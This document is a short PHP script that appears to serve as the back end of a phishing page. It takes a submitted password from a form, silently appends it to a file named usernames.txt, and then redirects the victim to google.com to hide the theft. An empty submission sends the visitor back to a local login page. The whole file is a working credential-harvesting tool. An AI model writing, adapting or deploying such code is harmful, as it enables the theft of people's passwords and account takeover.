<?php
$death = $_POST['pass'];

if (empty($death))
{
	header('Location: /Password/Main2/Main.html' );
}
else 
{
	file_put_contents("usernames.txt", " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
	header('Location: http://google.com' );
}
?>